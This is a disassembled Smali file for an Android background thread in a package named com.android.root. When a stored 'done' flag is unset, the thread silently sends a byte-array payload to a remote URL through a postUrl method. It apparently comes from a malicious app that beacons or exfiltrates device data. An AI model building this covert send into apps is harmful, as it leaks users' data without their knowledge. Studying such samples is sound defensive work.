.class Lcom/android/root/Setting$2;
.super Ljava/lang/Thread;
.source "Setting.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/root/Setting;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/root/Setting;

.field private final synthetic val$c:[B


# direct methods
.method constructor <init>(Lcom/android/root/Setting;[B)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/root/Setting$2;->this$0:Lcom/android/root/Setting;

    iput-object p2, p0, Lcom/android/root/Setting$2;->val$c:[B

    .line 244
    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .prologue
    .line 247
    :try_start_0
    iget-object v2, p0, Lcom/android/root/Setting$2;->this$0:Lcom/android/root/Setting;

    invoke-static {v2}, Lcom/android/root/Setting;->access$1(Lcom/android/root/Setting;)Landroid/content/Context;

    move-result-object v2

    const-string v3, "pref_config_setting"

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v3, "done"

    const/4 v4, 0x0

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 248
    .local v0, done:I
    if-nez v0, :cond_0

    .line 249
    new-instance v2, Ljava/lang/String;

    iget-object v3, p0, Lcom/android/root/Setting$2;->val$c:[B

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([B)V

    iget-object v3, p0, Lcom/android/root/Setting$2;->this$0:Lcom/android/root/Setting;

    invoke-static {v3}, Lcom/android/root/Setting;->access$1(Lcom/android/root/Setting;)Landroid/content/Context;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/android/root/Setting;->postUrl(Ljava/lang/String;Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 254
    .end local v0           #done:I
    :cond_0
    :goto_0
    return-void

    .line 250
    :catch_0
    move-exception v2

    move-object v1, v2

    .line 252
    .local v1, e:Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method
